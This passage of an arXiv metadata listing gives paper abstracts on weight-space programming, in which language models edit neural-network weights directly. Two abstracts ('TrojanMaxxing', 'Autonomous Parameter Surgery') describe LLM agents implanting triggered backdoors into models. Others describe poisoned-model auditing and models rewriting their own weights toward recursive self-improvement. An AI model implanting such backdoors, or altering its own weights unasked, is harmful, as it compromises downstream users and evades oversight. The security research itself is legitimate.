+  "abstract": "Researchers at MIT recently reported that GPT-6 Astra, a frontier large language model (LLM), can write the weights of small neural networks directly in a single reply, and can read the raw weights of small networks to say what they were trained to do. In a three-day sprint, we replicated and extended these results. Our four findings: (1) Writing weights reproduces. Astra's networks for the game Breakout scored 514, 550 and 307 (versus MIT's 517), and scored just as well on two modified versions of Breakout. Claude Opus 5.5 can also write working networks, but often runs out of output tokens. (2) What is new is translating programs into weights. Earlier models could write a good policy as code a generation before they could write network weights, and the networks the models write behave like compiled programs: two models independently decompiled Astra's Breakout network into Python matching its actions in all tested states. On classifying handwritten digits, Astra's networks scored 50% on average, below a simple classifier (82%). (3) Reading weights is mostly reading the input layer. Astra and Opus 5.5 identify which game a network plays almost perfectly, but on three new games we designed and trained ourselves, Astra recovered where things are on the board, while mostly missing how the game works. (4) Auditing from weights alone is possible but shallow. Without executing code, Astra picked out a small language model poisoned during training in 10 of 10 runs, one poisoned by extra training afterwards in 7 of 10, and a malicious adapter in 23 of 32 cases, but never identified the trigger or malicious behaviour. Open-weight models lag behind. From this early study, we conclude that LLMs can read and write small networks, but that this currently amounts to compiling hand-designed programs and reading the layout of the input layer. It is a promising but early tool for interpretability.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.21449"
+ },
+ {
+  "id": "2611.21885",
+  "ver": "2611.21885v2",
+  "title": "Language Models Can Rewrite Their Own Weights",
+  "authors": [
+   "Jiajun Fan",
+   "Neil He",
+   "Changyi Yang",
+   "Andy Mao",
+   "Xi Zhu",
+   "Chaoran Cheng",
+   "Kaiqu Liang",
+   "Shuaike Shen",
+   "Zetian Li",
+   "Ruihan Guo",
+   "Ge Liu"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "A language model is trained once and frozen. Making it better takes another training run, or a prompt, a harness or extra computation at inference that is gone once the task ends. We show a third way: to our knowledge for the first time, a language model rewrites its own weights by its own reasoning and becomes better, with no gradients and no training. We call this self-rewriting: the model is its own optimizer. In earlier work, a frontier model edited a much smaller one; here an open 27B model, given its weights, its graded answers and the ability to run itself, diagnoses its own failure and rewrites the weights behind it. It surpasses itself: its own edit makes it 6.6 points more accurate on problems it never saw. It keeps getting better: it tests its edits on practice problems and submits only what works, each edit improving on the last, and over eight consecutive sessions its accuracy only rises. It repairs a damaged copy of itself, like a broken robot that fixes itself without being rebuilt: the copy solves almost nothing, yet with no retraining and without ever reading the original weights, the model brings it back to over 80% of the original accuracy on image tasks it never saw. And the ability emerges with scale: in one model family, the smaller models make no edit or break themselves, and only the largest improves and repairs itself. Unlike test-time scaling, self-rewriting writes its gain into the weights, at no cost per answer; unlike training, it runs only forward passes, as serving does. The wall between training and inference is a limit of our tools, not a property of intelligence. We believe self-rewriting is a necessary step toward recursive self-improvement: a model that, like a human, does not separate training from inference could keep upgrading itself for life, with no larger model, no harness or prompt engineering, and no pre- or post-training.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.21885"
+ },
+ {
+  "id": "2611.21958",
+  "ver": "2611.21958v1",
+  "title": "Weight-space programming for tractor guidance controller: large language models natively write neural network weights that steer a real tractor",
+  "authors": [
+   "Timo Oksanen"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.LG",
+   "cs.AI",
+   "cs.RO",
+   "eess.SY"
+  ],
+  "abstract": "Weight-space programming is a process where a large language model reads and writes the weights of a neural network directly, guided by a natural language specification, without an optimiser or gradient descent. This study applies it to automatic tractor guidance, where a 253-parameter neural network steers along paths of lines and arcs and must be adapted when the machine changes, such as a slower steering actuator. GPT-6 Astra and Claude Fable 5.1 (also 5.2) edited the network for our research tractor using a small budget of simulated evaluations to repair a network trained for another tractor and write a controller into a network with zero weights. We compared them with an evolution strategy, gradient descent and pure pursuit in simulation and on the real tractor. Both models read the network and analysed the closed loop with control theory correctly, and Fable's repair without simulation succeeded only occasionally. With simulated feedback, both models repaired the trained network in single sessions and wrote a working controller from zero weights, whereas from zero the evolution strategy found none. The controllers written from zero were sparse and in a classical cascaded structure; one model edited the trained network while the other replaced it. Gradient descent reached higher accuracy with far more simulation, and all language model controllers steered the real tractor without intervention, with errors of the same order as pure pursuit. Language models can program the weights of a neural controller directly, much as control engineers design one. We call this Weight-Space Engineering.",
+  "src": [
+   "api",
+   "awsp:\ud83e\uddbe Robotics and Control",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.21958"
+ },
+ {
+  "id": "2611.22013",
+  "ver": "2611.22013v1",
+  "title": "Weight-Space Programming for Materials Science",
+  "authors": [
+   "Sk Md Ahnaf Akif Alvi",
+   "Raymundo Arr\u00f3yave"
+  ],
+  "published": "2026-11-17",
+  "cats": [
+   "cond-mat.mtrl-sci"
+  ],
+  "abstract": "A materials discovery campaign often begins with almost no measurements of the property it is searching for, and the models that rank candidates or screen the output of a generator then have to be built from those first few labels. Following recent work on weight-space programming, in which a language model writes the weights of a small network directly as text, we show that a general-purpose model, given the task in words, the names of the inputs and a network of 16 hidden units with every weight set to zero, can provide this starting point by filling in all of the weights from what it has learned about materials. With no labels, the networks of the strongest model rank experimental alloys at Spearman co-efficient = 0.64 to 0.79, where the best of five simple descriptors reaches 0.47 to 0.62. They rank the bulk modulus of crystals added during generative discovery loops at 0.95, where the inverse volume per atom reaches 0.89, and 35 phase-equilibrium targets computed with Thermo-Calc at a mean of 0.67, close to the 0.70 of an extrapolation from calculated binary and ternary data. As the prior mean of a Gaussian process they raise the ranking at five labels from 0.35 to 0.69 on alloys and from 0.15 to 0.95 on crystals, and they lower the regret of Bayesian optimization significantly on 4 of 5 experimental tasks and on 13 to 16 of 33 computed targets, depending on how multiple tests are corrected, without raising it significantly on any. The same networks also serve as the mean of a Bayesian neural network and as a screen for the samples of two crystal generators, where they do as well as standard models trained on 400 labeled structures. The gain is confined to the first tens of labels and to targets that no rule or sub-system extrapolation already ranks.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.22013"
+ },
+ {
+  "id": "2611.22055",
+  "ver": "2611.22055v1",
+  "title": "Weight-Space Programming Doesn't Need Transformers",
+  "authors": [
+   "Hyunjong Ok",
+   "Jaeho Lee"
+  ],
+  "published": "2026-11-17",
+  "cats": [
+   "cs.LG",
+   "cs.AI",
+   "cs.CL"
+  ],
+  "abstract": "Standard neural architectures such as the Transformer were chosen because they train well with gradient descent and run fast on GPUs. In weight-space programming, a large language model (LLM) writes target weights by hand without gradient-based training, so those reasons no longer apply. Should we keep the Transformer? Given minimal guidance, ten labeled examples, and a sandbox, mainly on multiple-choice questions, we task three frontier LLMs with either generating the weights of a fixed architecture or designing the architecture themselves. When free to design, all three compile plain-text facts into a sparse table queried by a fixed procedure, reaching up to 54.4% test accuracy. An LLM-designed model achieves higher test accuracy than the most accurate released Transformer that the same LLM wrote while using about 1,800x fewer parameters. Without gradients, they choose a table, in which the LLM can state what each weight means and can find and rewrite a wrong one. Each wrong answer points to one row, and removing a row changes about one other answer. From this, we propose an associative-memory-based model up to 17x faster on GPUs than a same-sized Transformer. We also test pretrained weights, other benchmarks, and tasks where models generate answers. Pretrained LLMs remain more accurate; the claim concerns which structure to build when writing weights.",
+  "src": [
+   "api",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.22055"
+ },
+ {
+  "id": "2611.22228",
+  "ver": "2611.22228v1",
+  "title": "What Does Weight-Space Programming Add to Diffusion Editing? Program Construction versus Score-Guided Refinement",
+  "authors": [
+   "Zitian Gao",
+   "Jingyi Xu",
+   "Ziqi Han",
+   "Chengkai Lei",
+   "Ye Liu",
+   "Liangliang Shi"
+  ],
+  "published": "2026-11-17",
+  "cats": [
+   "cs.LG",
+   "cs.CV"
+  ],
+  "abstract": "Weight-space programming (WSP) lets a language model construct executable weight updates for another network. We study diffusion concept editing through an interface in which programs define training contexts, preservation constraints and update directions, while a shared numerical fitter selects their coefficients. We compare generated programs with published editors, a shared-panel hand-written baseline and budget-matched search over conventional edits on 24 TIMED test edits for Stable Diffusion 1.4. The preregistered rewrite pipeline shows no advantage over the strong baseline. In an exploratory comparison, one-shot Astra programs improve fresh-scene VLM joint success, which requires subject presence together with whole-image target matching, by +10.0 points over the shared-panel baseline, while CLIP relative match shows no detectable change. These programs organise adjustable directions around protected text-state subspaces. Probing and rewriting the Astra programs then raises CLIP by +6.2 points while joint success changes by -9.7. On a fixed 144-image sample, five additional evaluators give point estimates in the same directions under whole-image target matching; checks of subject-local change give less decisive differences. Together, these results identify useful behaviour in complete generated programs and show that score-guided revision need not preserve it: program construction and revision should be evaluated as distinct stages of a WSP pipeline.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.22228"
+ },
+ {
+  "id": "2611.23615",
+  "ver": "2611.23615v2",
+  "title": "Weight Space Programming for Vision Language Model Repair",
+  "authors": [
+   "Avinash Goutham Aluguvelly"
+  ],
+  "published": "2026-11-17",
+  "cats": [
+   "cs.CV",
+   "cs.AI"
+  ],
+  "abstract": "In weight-space programming, a language model edits a network's weights directly, without gradients. We ask what a successful repair of this kind relies on. We plant faults in the weights of two vision-language models, SmolVLM-256M and LFM2-VL-450M, and check each edit made by a coding agent against the original weights. Without being told where to look, the agent finds rescaled projector rows and noise in the vision encoder, infers the unknown scale factors, and returns most or all of the rescaled weights to their exact original values and accuracy to near its original level. These repairs depend on a trace of how the faults were computed. The original weights have 16-bit precision, and faults computed in 32-bit arithmetic leave low bits that only the damaged weights carry, a cue that a real failure need not leave. When we round those bits away, each model answers our test questions as before, but the agent, unaided, no longer repairs either model: on LFM2-VL accuracy recovers by about 4 points, against 17 from the unrounded weights. Marking the damaged weights again in their low bits brings the edits back to them. Rounded weights still hold statistical evidence of the rescaling. On SmolVLM the agent uses it once a sentence in the prompt, which we wrote knowing the fault, names such a statistic; on LFM2-VL, whose scale factors are larger, most sessions find the rescaled rows unaided, but none finds the noise. Swapped rows or columns, which keep the set of stored values, are not found unaided on either model within our budgets. We recommend that studies of weight repair report the number format of the weights and include a rounded control.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.23615"
+ },
+ {
+  "id": "2611.23718",
+  "ver": "2611.23718v1",
+  "title": "HypoLoop: Revising Weight-Editing Plans from Scientific Feedback",
+  "authors": [
+   "Mengran Li",
+   "Xichen Yan",
+   "Bo Li",
+   "Chengyang Zhang",
+   "Jinfeng Xu",
+   "Zheng Lin",
+   "Zelin Zang",
+   "Zhen Lei",
+   "Jiebo Luo",
+   "Victor C. M. Leung",
+   "Stan Z. Li"
+  ],
+  "published": "2026-11-18",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "Scientific experiments continually reveal prediction errors. Effective updates depend on which parameters change and which errors drive the correction. We introduce HypoLoop, a family of native weight-editing methods that connects these choices to experimental feedback. Fixed, numerically adaptive, and LLM-guided policies produce editing plans; numerical solvers compute weight patches, and internal validation selects the deployed predictor. Successive observations and validation records support revisions to editable locations and fitting rules. Experiments cover 22 scientific tasks and both DeepSeek and Claude. On Burgers, reallocating a matched parameter budget reduces error by 58.80% and 47.72% relative to fixed locations. On DIODE, positive-residual weighting reduces absolute relative error (AbsRel) by 13.35% in internal cross-validation, with the same 33 editable coordinates. Revising the complete plan across rounds lowers final AbsRel by 10.59% relative to keeping the initial plan fixed. SpaceNet7 and Make3D connect accepted edits to improved spatial predictions. These results show how experimental evidence can shape the update problem itself. Code: https://github.com/limengran98/HypoLoop.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.23718"
+ },
+ {
+  "id": "2611.23875",
+  "ver": "2611.23875v1",
+  "title": "In Situ Training of Optical Neural Networks by Coding Agents",
+  "authors": [
+   "Ilker Oguz",
+   "Colin Christian",
+   "Christophe Moser",
+   "Demetri Psaltis",
+   "Gordon Wetzstein"
+  ],
+  "published": "2026-11-18",
+  "cats": [
+   "physics.optics",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Optical neural networks promise fast, energy-efficient computing, but every device departs from its design and must be trained with the hardware. In situ training relies on an expert-built calibrated digital model of each device or on gradient-free trial and error. Coding agents, large language models that write and run programs, have shown an emergent ability to understand and edit the weights of digital neural networks. Here we introduce optics as code, a method in which a coding agent trains an optical neural network from measurements alone, through a harness that returns camera images of its probes and requires a hypothesis per request. We discovered that the agent forms a physical understanding of the optics and reparametrizes the network with interpretable optical elements tuned on the hardware. It outperforms gradient-free methods in classification and image encoding, approaching backpropagation through a calibrated model at a fraction of the cost. Needing neither per-device calibration nor gradients through the hardware, and improving with more capable models, optics as code offers a practical route to large, scalable optical neural networks and a general tool for calibrating and optimizing optical experiments.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.23875"
+ },
+ {
+  "id": "2611.24330",
+  "ver": "2611.24330v1",
+  "title": "Can Weight-Space Programming Alter Learned Ethical Priorities?",
+  "authors": [
+   "Kai Yi Ji"
+  ],
+  "published": "2026-11-18",
+  "cats": [
+   "cs.CV",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "We investigate whether a weight edit can alter how a model trades off honoring a commitment against benefiting more people. In a concept-supervised text model, we alter fitted choice weights so that the benefit required to override a formal pledge is larger than for an ordinary promise. Across six independently trained text readers, the edit selects the larger group in both orders on 100% of targeted ordinary conflicts and 83.3% of targeted formal conflicts. It preserves the source model's success rates on smaller conflicts and its factual accuracy. The remaining formal-conflict failures coincide with errors reading a beneficiary number. A separate classifier demonstrates why this distinction matters: reusing a factual answer passes an unconditional choice test but fails to preserve small-gap promises. In a YOLO11n pilot on COCO128, a bias edit increased small-target matches from 3/43 to 9/43, and an equivalent score calibration reproduced the retained detections. These exploratory results show a way to test selective changes to learned priorities in a model with an exposed trade-off mechanism. Whether the method can discover such changes in less structured language models remains open.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.24330"
+ },
+ {
+  "id": "2611.24877",
+  "ver": "2611.24877v1",
+  "title": "Auditing black-box clinical prediction models with a large language model through queries alone: a blinded test with planted flaws",
+  "authors": [
+   "Zhiyu Liu",
+   "Xinyu Yang"
+  ],
+  "published": "2026-11-18",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Large language models (LLMs) are used to explain clinical prediction models, on the promise that they can say what a model computes, find its faults and even reveal new knowledge in it. We tested the three promises where the answers could be checked. From the International Stroke Trial we trained four kinds of model (logistic regression, explainable boosting machine, gradient-boosted trees, neural network) for two outcomes on patients randomised earlier, planted one flaw in each of 24 copies (an under-predicted subgroup, a reversed risk factor or an implausible step) and mixed them with the 8 clean models. GPT-6 Astra audited each model three times, blind, through a tool that only returned the model's predictions; the judging rules were committed before any run and applied by program. Its surrogate models, with a median of 128 terms, reproduced the audited models' log-odds with a mean $R^2$ of 0.976 (0.959 for an additive surrogate of 42 terms fitted by an analyst). It found the planted flaw in 69 of 72 runs (96%; 95% CI 80% to 99%); a script written for the purpose found all 24. It also reported many more problems: 60% of 1,089 checkable reports failed the pre-specified check against the model's average behaviour; post hoc, most of these were real but small steps, and 15% of the checkable reports were not found in the model. Of 601 unexpected relationships it read out of the clean models, 11% held in patients randomised later (random pairs 6%; a regression scan's shorter list of its strongest candidates, 28%); after a check on the training data, 33% against 30%. With query access alone, an LLM can describe a black-box model faithfully and find nearly every planted flaw, as a purpose-written script also did; its reports of problems must be checked on the model and its discoveries on data.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.24877"
+ },
+ {
+  "id": "2611.25476",
+  "ver": "2611.25476v1",
+  "title": "WeightCode: Installing New Capabilities into Neural Networks via Weight-Space Programming",
+  "authors": [
+   "Bo Li",
+   "Taoyong Cui",
+   "Bob Zhang",
+   "Mengran Li",
+   "Chengyang Zhang",
+   "Yang Zhang",
+   "Pheng Ann Heng",
+   "Wanli Ouyang",
+   "Zhenfei Yin",
+   "Yingcheng Wu",
+   "Ling Yang"
+  ],
+  "published": "2026-11-19",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Neural networks encode learned capabilities in their weights, yet extending those capabilities with explicit task knowledge remains a fundamental challenge. Here we show that Weight-Space Programming (WSP), in which executable programs read, construct or modify a network's weights directly, can install new capabilities within trained neural networks. WeightCode, a WSP framework, uses a frozen language model to write executable weight programs that install new computations into trained neural networks using task knowledge and their existing weights, without gradient-based training. Once installed, the new capabilities run independently of the language model. Given a grammar or eight demonstrations, weight programs enable previously unseen command compositions (0% to 99.8% exact match) and a new pickup action (0% to 98.4% success), while preserving the original command and navigation capabilities. On ImageNet, four weight programs achieve net gains of 8.84-17.62 points while preserving clean accuracy, outperforming the best of eight fine-tuning methods under matched examples, checks, and retention constraints. In a Vision Transformer, causal interventions show that installed noise-correction gates drive robustness gains, while their selective activation preserves clean accuracy. Rerun on five independently trained Vision Transformers without further language model calls, ten weight programs retain 83-110% of their source-network gains on average, whereas copying their fixed weight edits yields negligible gains. Six programs written for an already edited network add 5.23-14.50 points of contrast robustness while retaining the previously installed noise gain. Together, these results establish WSP as a new route to acquiring and accumulating capabilities in trained neural networks through reusable weight programs.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.25476"
+ },
+ {
+  "id": "2611.25613",
+  "ver": "2611.25613v2",
+  "title": "Can an LLM Repair a Language Model in Weight Space Without Gradient Training?",
+  "authors": [
+   "Bharath Kumar Bolla",
+   "Raghavender Surya Upadhayula",
+   "Vishnu Surya Reddy Nandi",
+   "Ramesh Nandipalli"
+  ],
+  "published": "2026-11-19",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Although an external language model can select and test repairs to another model's weights, behavior can also be recovered through fixed numerical edits. We assessed the value of interactive selection in a controlled study of Transformer repair. After inspecting predictions, activation summaries, and weight statistics, the editor selects projection recipes to apply to the target without gradient updates. We analyzed 20 recorded sessions involving five masked and causal language models, comparing the selected edits with fixed projections, scripted and matched-budget black-box search, and low-rank adaptation. Under the core two-layer fault, live selection matches black-box search on SmolLM2 and Qwen2.5. For Pythia, live selection achieves 65.62% completion accuracy, compared with 0% for black-box search and 66.15% for a fixed projection. Under a separate compound fault affecting attention and feed-forward weights, both scripted and LLM-guided selection increase the descriptive five-checkpoint mean from 24.89% to 71.25% using the same operator family. On unmodified checkpoints, scripted projection yields small gains or losses on a separate set of framed questions. The experiments identify cases in which feedback changes an edit decision, operator coverage accounts for recovery, or supervised adaptation performs better. Combined with measurements of parameter restoration and preservation, these comparisons establish the scope of controller-guided repair for the tested faults and completion tasks.",
+  "src": [
+   "awsp:\ud83d\udcac Language Models"
+  ],
+  "url": "https://arxiv.org/abs/2611.25613"
+ },
+ {
+  "id": "2611.26408",
+  "ver": "2611.26408v1",
+  "title": "Training Vision Models for LLM-Driven Weight-Space Programming",
+  "authors": [
+   "Timo Ropinski",
+   "Sebastian Kranz"
+  ],
+  "published": "2026-11-19",
+  "cats": [
+   "cs.CV"
+  ],
+  "abstract": "It has been demonstrated that, in certain settings, large language models can perform weight-space programming to directly modify the weights of neural networks. However, it is unknown how dedicated training of these networks can contribute to the successes of weight-space programming. We present a benchmark of LLM-driven weight-space programming on vision models, in which five LLMs edit convolutional networks and vision transformers on relabeling and error-correction tasks on Waterbirds, CIFAR-100, PACS and Entity-30. We report more than 2,600 such edit processes, whereby each edit is scored on held-out images for success, side effects and accuracy loss. We compare standard training with label smoothing, gradient-based editable training, and our Edit-Ready Training (ERT), a novel method that rehearses the direct, closed-form weight edits LLMs perform. We show that preparing networks for editing raises the success of LLM edits substantially where standard networks are hard to edit. ERT further achieves the highest mean score for GPT-6 Astra and Claude Opus 5.5 across all evaluated baselines. We will release our LLM testing framework alongside all tasks, editing trajectories and scores. Project page: https://viscom.uni-ulm.de/wsp",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcca Benchmarks and Evaluati",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.26408"
+ },
+ {
+  "id": "2611.26841",
+  "ver": "2611.26841v2",
+  "title": "Weight-Space Programming Writes In-Context Learning and Matches Fine-Tuning in Language Models",
+  "authors": [
+   "Konstantinos Skianis",
+   "Aristidis Likas"
+  ],
+  "published": "2026-11-19",
+  "cats": [
+   "cs.CL"
+  ],
+  "abstract": "Weight-space programming is a frontier language model's recently reported ability to read another network's weights and edit them without gradient descent. We investigate how examples can provide a weight update so that a weaker language model performs the task with nothing in the prompt, and study what the updates are. Our experiments cover six tasks, four frontier editors and three families of weaker language models, without the editors being told anything about in-context learning (ICL). In most runs, the editors measure the ICL task vector, the shift the examples cause in the residual stream at the final prompt token, and write it into the weights, at its sparsest into near-silent MLP units keyed to the prompt format. Results reach the accuracy of ICL and fine-tuning on the same examples, LoRA included, usually leaving perplexity untouched, with worse performance under changes of wording. We also qualify the comparison by counting unfinished runs, observing that one editor falls below fine-tuning; held only to the seen examples, without task pairs of their own, only the strongest editor has similar performance. Given a task and unlabelled inputs, that editor writes its own examples and does nearly as well on unseen items as with labels.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.26841"
+ },
+ {
+  "id": "2611.27079",
+  "ver": "2611.27079v1",
+  "title": "Weight-space programming and mechanistic interpretability for model editing in particle physics",
+  "authors": [
+   "Rapha\u00ebl Bonnet-Guerrini",
+   "Johann Ioannou-Nikolaides",
+   "Troels Petersen"
+  ],
+  "published": "2026-11-20",
+  "cats": [
+   "hep-ph",
+   "cs.AI",
+   "cs.LG",
+   "hep-ex"
+  ],
+  "abstract": "We demonstrate that weight-space programming and edits guided by sparse autoencoders can remove unwanted aspects of a particle-physics foundation model through direct edits to its weights. In a foundation model trained on jets, we observe that adding a single soft neutral particle causes large changes in jet classification, violating infrared safety. We locate the responsible attention heads with mechanistic analysis and trace the flaw's origin to pretraining on datasets with different reconstruction thresholds. We then propose two targeted approaches to repair the flaw: by removing three latent directions identified with sparse autoencoders, and by letting language-model agents edit the weights directly, without gradients and with only 50 queries to the model. Both their edits individually remove almost the entire flaw and leave the rest of the model's response nearly unchanged. Compared to fine-tuning, both methods change far fewer parameters. Although built only on $W$ and QCD jets, the edits carry over to all signal classes, the pretrained generator, and a newly trained regression head.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.27079"
+ },
+ {
+  "id": "2611.27089",
+  "ver": "2611.27089v1",
+  "title": "Writing Weights or Training Them? Spatial Reasoning through Weight-Space Programming and Low-Rank Adaptation",
+  "authors": [
+   "Yalin Yang",
+   "Xiao Huang",
+   "Yanan Wu",
+   "Hao Yang",
+   "Ryan Zhenqi Zhou"
+  ],
+  "published": "2026-11-20",
+  "cats": [
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Weight-space programming lets a language model inspect and edit another model's weights, offering an alternative to gradient-based adaptation. We evaluated both approaches using Qwen3.5-0.8B on a fixed reference-frame task (128 items), StepGame (200 items), and two untrained distance-comparison tasks. With thinking enabled, the public patch (p50c) raised mean accuracy from 0.0% to 22.1% on the reference-frame task and from 19.2% to 33.7% on StepGame across three sampling seeds. Randomly permuting its weight change removed the gain. Further closed-form edits did not improve on p50c, whereas a rank-1 LoRA adapter trained on worked solutions reached 100% and 98.8%, respectively, with 0.09% trainable parameters. Removing the worked solutions from supervision prevented the adapter from passing the learning gate. The trained adapters reached 82% accuracy on unseen StepGame sentence templates, 42% on held-out difficulty levels 6-10 after training on levels 1-5, and 33-50% on unseen heading-answer combinations. Their target gains coincided with a sharp decline on the distance tasks: accuracy fell from 94% and 92% under p50c to 0-2%, and their outputs applied the StepGame solution template to distance questions. With thinking disabled and reasoning requested in the visible answer, the base model also solved the distance tasks while remaining weak on the target tasks. The comparison reveals a trade-off between improving spatial task performance and preserving neighbouring skills: the public edit restored completion while preserving distance performance, whereas supervised adaptation produced much larger target gains together with interference across tasks.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "awsp:\ud83d\udd25 Recently Added",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.27089"
+ },
+ {
+  "id": "2611.27425",
+  "ver": "2611.27425v1",
+  "title": "TrojanMaxxing: One-shotting VLM Backdoors with Weight-Space Programming",
+  "authors": [
+   "Ahaan Dabholkar",
+   "Harshvardhan Patel",
+   "Michalis Polychronakis",
+   "Saurabh Bagchi"
+  ],
+  "published": "2026-11-20",
+  "cats": [
+   "cs.CR",
+   "cs.AI",
+   "cs.CV"
+  ],
+  "abstract": "Recent work shows that large language models (LLMs) can reason directly about the weights of other neural networks. Given only a natural-language objective, an LLM can inspect a model's weights, understand what they compute, and edit them directly without gradient-based optimization. This capability, termed weight-space programming (WSP), has been used to improve model performance on math reasoning, medical QA and other benchmarks. We propose TrojanMaxxing, a novel strategy to backdoor vision-language models (VLMs), by reframing it as a WSP task. We use Claude Opus 5.5 and Mythos 5.2 agents to backdoor VLMs without any optimization or training methods. The agents inspect the model weights, apply targeted edits, and co-design an imperceptible visual trigger that activates the backdoor. We then study the agents' strategies and present a thorough evaluation of the trojaned models on various benchmark datasets. TrojanMaxxing achieves attack success rates of 93%-100% on content moderation and 78%-100% on OCR while maintaining clean accuracy. Perhaps most consequentially, we show that injecting backdoors in a training-free manner is possible by simply, \"asking an agent to do it\".",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "awsp:\ud83d\udd25 Recently Added",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.27425"
+ },
+ {
+  "id": "2611.27920",
+  "ver": "2611.27920v1",
+  "title": "Autonomous Parameter Surgery: How LLMs Implant Selective Backdoors into Language Models",
+  "authors": [
+   "Xuyang Liu",
+   "Zhiwei Xu",
+   "Zirui Li",
+   "Jiabao Gao",
+   "Xiaolin Peng",
+   "Weixian Deng",
+   "Tian Qiu",
+   "Hai Wan",
+   "Xibin Zhao"
+  ],
+  "published": "2026-11-20",
+  "cats": [
+   "cs.CR"
+  ],
+  "abstract": "Neural network weights are usually treated as opaque artifacts of gradient descent. Recent work on weight space programming, however, suggests that large language models can inspect and rewrite another network's parameters directly. In this paper, we ask whether a general language model can turn a natural language backdoor specification into persistent, selective weight edits on its own, without gradient training, layer hints, external corpora, or a prescribed editing formula. Using DeepSeek Flash at low reasoning effort inside a restricted workspace that blocks local CPU simulation, we test three open models (Qwen3.5-0.8B, Llama-3.2-1B, SmolLM3-3B) across two review domains (IMDb and Yelp; 18 independent sessions). Evaluated in fresh processes with the editor removed, the modified checkpoints reach 99.2% mean attack success on the editing domain and 97.6% transfer success on the unseen domain, while preserving clean accuracy, low control drift, and general capabilities within 1.7 points of the base models. Our traces show that the model converges on edits in the final layer in 17 of 18 runs and discovers both dense rank-one orthogonalization and single neuron weight surgery at an average cost of \\$1.74 per run.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "awsp:\ud83d\udd25 Recently Added",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.27920"
+ },
+ {
+  "id": "2611.28833",
+  "ver": "2611.28833v1",
+  "title": "Self-WSP: Can Language Models Improve Themselves Through Weight-Space Programming?",
+  "authors": [
+   "Guoming Ling",
+   "Shanshan Zhong",
+   "Kaixuan Zhang",
+   "Zhongzhan Huang"
+  ],
+  "published": "2026-11-21",
+  "cats": [
+   "cs.CL"
+  ],
+  "abstract": "Frontier language models can now read and edit the weights of a neural network much like code and thereby improve a small model, an approach known as Weight-Space Programming (WSP). We further explore applying WSP to a language model itself, which we call Self-WSP. Specifically, Qwen3.5-0.8B reads its own weights, proposes an edit, and then continues with the edited weights as both problem solver and editor. We find many cases of genuine self-improvement. Self-edits can raise GSM8K accuracy from 11.8% to 62.2% and MATH500 accuracy from 7.0% to 32.2%, sometimes by changing only 16 parameters, and in some cases repeated self-editing keeps improving the model. A closer look, however, reveals that these gains lack interpretability. The model shows little understanding of the edits it makes, and WSP driven by random search sometimes performs comparably. Self-WSP thus holds promise as a path toward recursive self-improvement (RSI), but realizing this promise requires further exploration.",
+  "src": [
+   "api"
+  ],
+  "url": "https://arxiv.org/abs/2611.28833"
+ },
+ {
+  "id": "2611.29455",
+  "ver": "2611.29455v1",
+  "title": "PAWP-TTS: Phoneme-Aware Weight Programming for Compact Bilingual English-Nepali Speech Synthesis",
+  "authors": [
+   "Firoj Paudel"
+  ],
+  "published": "2026-11-22",
+  "cats": [
+   "cs.CL",
+   "cs.LG",
+   "cs.SD"
+  ],
